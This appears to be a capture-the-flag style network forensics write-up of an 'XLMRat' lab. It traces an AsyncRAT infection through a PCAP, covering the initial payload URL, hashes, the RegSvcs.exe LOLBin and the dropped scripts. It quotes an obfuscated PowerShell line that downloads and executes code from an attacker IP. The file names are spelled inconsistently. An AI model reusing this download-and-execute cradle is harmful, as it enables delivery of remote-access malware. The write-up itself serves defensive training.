---
title: "XLMRat Cyberdefense"
source: "https://chocolate-track-8f8.notion.site/XLMRat-Cyberdefense-403c20b2db8d808b954ef90e5c540784"
date: 2026-10-29
description: "Cyberdefense Lab - XLMRat"
tags: [Analysis, Wireshark, TCP]
category: Network Analysis
---

## Lab Scenario

A compromised machine was flagged for suspicious network traffic. This analysis examines the PCAP to identify the apparent attack method and payloads, and to reconstruct the sequence of events. It focuses on the suspected initial access, the techniques observed, and the malware’s activity after compromise.

## Tools

- Wireshark — to analyze the packet capture (PCAP) file
- CyberChef - To convert hexadecimal to SHA
- hostingchecker.com - To check for host
- VirusTotal - OSINT to classify malware


## Questions

## 1. The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?


I inspect the traffic in Wireshark and filter by TCP. 

![](https://chocolate-track-8f8.notion.site/image/attachment%3A6b132ac9-4335-4589-8918-d88178ef04b0%3Aimage.png?table=block&id=404c20b2-db8d-80b6-9264-ccd07d75eb1f&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

One of the HTTP request targets port 222, which is unusual for HTTP traffic.

![](https://chocolate-track-8f8.notion.site/image/attachment%3Ad5ea53b1-6102-4304-bcf9-b86abc17abca%3Aimage.png?table=block&id=404c20b2-db8d-80a5-a901-f71e2e897970&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Following this TCP stream revealed a suspicious response body.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A851090ae-2e47-46be-8fa3-e9c58098caf0%3Aimage.png?table=block&id=404c20b2-db8d-80c6-a81a-f8405f0f6dcc&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Reconstructing the LZeWX stream produced the following string:
```
[B`YT`e[]];$A123='IEX(NEW-OBJECT NeT.WEBCLIENT).DOWNLOADSTRING('http://45.126.209.4:222/mdm.jpg'')'.REPLACE('VAN','ADSTRING');[BYTe[]];IEX($A123+$B456+$C789)
```

This appears to be an obfuscated PowerShell script. It uses a remote request for `/mdm.jpg` and appears intended to execute retrieved code.

The next TCP stream also contains suspicious content.
![](https://chocolate-track-8f8.notion.site/image/attachment%3Ac7e0b46d-d0aa-45ab-9eba-f1c06b67aa47%3Aimage.png?table=block&id=404c20b2-db8d-80a9-bb4b-e1cc84dd6637&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Based on this request, the first-stage payload appears to have been downloaded from (http://45.126.209.4:222/mdm.jpg).

## 2. Which hosting provider owns the associated IP address?

I used hostingchecker.com, a hosting lookup site, to lookup for the host's IP address.

![](https://chocolate-track-8f8.notion.site/image/attachment%3Aa3c7fb44-5b1a-4d18-9f8c-823c15e241b0%3Aimage.png?table=block&id=404c20b2-db8d-8090-bbc3-fe45d9287234&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 3. By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA-256 hash of the malware executable?

The script contains two large hexadecimal arrays: `$hexString_pe` and `$hexString_bbb`.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A23a9489e-0c51-4dec-83c6-95800f74b4bb%3Aimage.png?table=block&id=404c20b2-db8d-8023-995b-c8de832289d8&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

`$hexString_pe` appears to be loaded as a .NET assembly.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A6afee56b-6cf2-4a0d-a7a5-bde3d161a3cd%3Aimage.png?table=block&id=404c20b2-db8d-806c-bbc7-f95f1a5e96ff&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

`$hexString_bbb` is passed to the assembly’s `Execute` method alongside `RegSvcs.exe`, suggesting that it contains the malware payload.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A216ab944-9ec1-41a8-b5fd-7ce03731a3b5%3Aimage.png?table=block&id=404c20b2-db8d-80d5-95c7-f4427ad46943&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

I used CyberChef to calculate the SHA-256 hash of the hexadecimal data in `$hexString_bbb`.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A4b315e11-aaa1-4940-afe4-95ac678edb18%3Aimage.png?table=block&id=404c20b2-db8d-808e-a4fc-d7d364402f23&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

SHA-256: `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`

## 4. What is the malware family label based on Alibaba?

VirusTotal’s Alibaba detection engine labels the malware as AsyncRAT.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A1d121044-e230-48b1-80dc-17d5313461a7%3Aimage.png?table=block&id=404c20b2-db8d-80bb-885f-f4be69a6c107&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 5. What is the malware’s PE header compile timestamp (creation time)?

The Details tab lists the malware’s PE compile timestamp as 2023-10-30 15:08:44 UTC.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A6d90f628-ccd7-4d3a-8eb8-f8dbc4b91be8%3Aimage.png?table=block&id=404c20b2-db8d-8036-92c3-d8bcffe3730e&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## 6. Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

The script uses `RegSvcs.exe` to load the .NET-related payload.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A1e395a95-df18-4907-ba74-2a020f10a63c%3Aimage.png?table=block&id=404c20b2-db8d-80ee-bb83-fafae6a228fb&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Full path

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
```

## 7. The script is designed to drop several files. List the names of the files dropped by the script.

The script first drops `Conted.vbs`.  
It then runs `Contend.bat`, which in turn runs `Contend.ps1`.

![](https://chocolate-track-8f8.notion.site/image/attachment%3A5b4c0559-5b44-4848-8591-ff758d261b3e%3Aimage.png?table=block&id=404c20b2-db8d-80c2-a8b4-c15a2bd27475&spaceId=6b4c20b2-db8d-8188-975b-00039462c080&width=1020&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

## Conculsion
By analysing the PCAP file, I've identified suspicious network activity with multi-stage malware infection. My investigation revealed a HTTP request to http://45.126.209.4:222/mdm.jpg, which contained an obfuscated Powershell Command.

Further anlaysis of the script revealed a .NET assembly used as a loader and a secondary executable, which was identified as AsyncRAT based on Alibaba's VirusTotal. The script also leveraged RegSvs.exe, a legitimate Windows utility to execute the payload and was designed to drop the files Conted.vbs, Conted.bat and Conted.ps1.

The findings higlights the importance of:
1. Network monitoring: Implementing firewall to block unusual network traffic such as an outbound HTTP request using port 222.
2. Priveleges: Applying least-privelege to application and restrict unecessary administrative priveleges.